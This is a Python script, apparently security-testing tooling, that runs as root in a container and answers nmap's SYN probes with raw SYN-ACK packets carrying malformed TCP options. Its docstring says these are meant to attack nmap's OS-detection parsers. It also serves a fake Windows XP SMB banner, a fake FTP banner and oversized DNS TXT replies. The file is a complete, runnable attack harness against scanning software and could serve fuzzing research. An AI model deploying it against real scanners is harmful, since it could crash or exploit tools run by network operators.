#!/usr/bin/env python3
"""
Hostile raw-packet responder for nmap OS detection (-O) attack, to run as
root inside a privileged container.

Crafts raw SYN-ACK replies to nmap's SYN probes with hostile TCP options:
oversized option lists, unknown option types, malformed WScale/MSS values,
padding with hostile bytes — feeding osscan2/FPEngine raw parsers.

Also serves a hostile banner on TCP 445 (real SMB portrule) and DNS on 53.
"""
import socket
import struct
import threading
import time
import sys

def tcp_checksum(src, dst, tcp_hdr_and_data):
    s = 0
    # pseudo header
    pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, 6, len(tcp_hdr_and_data))
    data = pseudo + tcp_hdr_and_data
    if len(data) % 2:
        data += b"\x00"
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF

def hostile_options(variant):
    if variant == "oversize":
        # data_offset 15 => 40 bytes of options, hostile mix
        opts = (b"\x02\x04\x05\xb4"      # MSS 1460
                b"\x03\x03\x0a"            # WScale 10 (out of RFC range)
                b"\x04\x02"                # SACKOK
                b"\x08\x0a\x00\x00\x00\x00\x00\x00\x00\x00"  # TS
                b"\x01\x01"                # NOP NOP
                b"\xfd\x06\xde\xad\xbe\xef"  # unknown opt 0xfd len 6
                b"\x00\x00\x00\x00\x00\x00\x00\x00")  # padding
    elif variant == "weird":
        opts = (b"\xff\x14" + b"\x41" * 18 +   # unknown opt 0xff claiming len 20
                b"\x03\x01\x63" +               # WScale oplen=1 (malformed!)
                b"\x02\x02")                    # MSS oplen=2 (malformed!)
    elif variant == "extreme":
        opts = b"\xfd\xff" + b"\x42" * 38       # option claiming 255 length
    else:  # valid
        opts = (b"\x02\x04\x05\xb4\x04\x02\x08\x0a"
                b"\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x03\x03\x07\x01\x01\x01\x01")
    return opts

def craft_synack(src_ip, dst_ip, sport, dport, seq, ack, variant):
    opts = hostile_options(variant)
    doff = 5 + (len(opts) // 4)
    while len(opts) % 4:
        opts += b"\x00"
    # window 0x16D0 (5840, classic Linux), flags SYN+ACK
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, ack,
                      (doff << 4), 0x12, 0x16D0, 0, 0) + opts
    csum = tcp_checksum(src_ip, dst_ip, tcp)
    tcp = tcp[:16] + struct.pack("!H", csum) + tcp[18:]
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp), 1, 0, 64, 6, 0,
                    socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    return ip + tcp

def raw_responder(container_ip, variant):
    """Sniff for SYNs to container and reply with hostile SYN-ACKs."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((container_ip, 0))
    except Exception as e:
        print(f"[!] raw bind failed: {e}", flush=True)
        return
    print(f"[*] raw hostile TCP responder on {container_ip} variant={variant}", flush=True)
    s.settimeout(20)
    my_seq = 0x1000
    while True:
        try:
            data, addr = s.recvfrom(65535)
        except socket.timeout:
            continue
        except OSError:
            return
        if len(data) < 40:
            continue
        ip_hdr_len = (data[0] & 0xF) * 4
        tcp = data[ip_hdr_len:]
        if len(tcp) < 20:
            continue
        sport, dport, seq, ack_num = struct.unpack("!HHII", tcp[:12])
        flags = tcp[13]
        src_ip = socket.inet_ntoa(data[12:16])
        dst_ip = socket.inet_ntoa(data[16:20])
        # reply to SYNs addressed to us from elsewhere
        if flags & 0x02 and not (flags & 0x10) and dst_ip == container_ip and src_ip != container_ip:
            my_seq = (my_seq + 1) & 0xFFFFFFFF
            pkt = craft_synack(container_ip, src_ip, dport, sport,
                               my_seq, (seq + 1) & 0xFFFFFFFF, variant)
            try:
                s.sendto(pkt, (src_ip, sport))
            except OSError:
                pass

def banner_server(port, banner):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(8)
    print(f"[*] hostile banner on :{port}", flush=True)
    while True:
        conn, _ = srv.accept()
        def h(c):
            try:
                c.settimeout(5)
                c.sendall(banner)
                try: c.recv(2048)
                except Exception: pass
                c.sendall(banner)
            except Exception: pass
            finally:
                try: c.close()
                except Exception: pass
        threading.Thread(target=h, args=(conn,), daemon=True).start()

def dns_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("0.0.0.0", 53))
    print("[*] hostile DNS on :53", flush=True)
    while True:
        data, addr = s.recvfrom(4096)
        if len(data) < 12: continue
        txid = data[:2]
        # echo question, giant TXT answer
        pos = 12
        try:
            while pos < len(data) and data[pos] != 0:
                if data[pos] & 0xC0 == 0xC0: pos += 2; break
                pos += 1 + data[pos]
            pos += 1; pos += 4
        except Exception:
            pos = len(data)
        question = data[12:pos]
        rdata = bytes([100]) + b"T" * 300
        ans = question + struct.pack(">HHIH", 16, 1, 120, len(rdata)) + rdata
        resp = txid + struct.pack(">HHHHH", 0x8180, 1, 1, 0, 0) + question + ans
        try: s.sendto(resp, addr)
        except Exception: pass

def main():
    container_ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    variant = sys.argv[2] if len(sys.argv) > 2 else "valid"
    # banner servers on privileged ports
    threading.Thread(target=banner_server, args=(445, b"Microsoft Windows XP [Version 5.1.2600]\r\n(C) Copyright 1985-2001\r\n\r\n"), daemon=True).start()
    threading.Thread(target=dns_server, daemon=True).start()
    threading.Thread(target=banner_server, args=(2121, b"220 hostile FTP\r\n"), daemon=True).start()
    # raw hostile TCP responder
    threading.Thread(target=raw_responder, args=(container_ip, variant), daemon=True).start()
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()
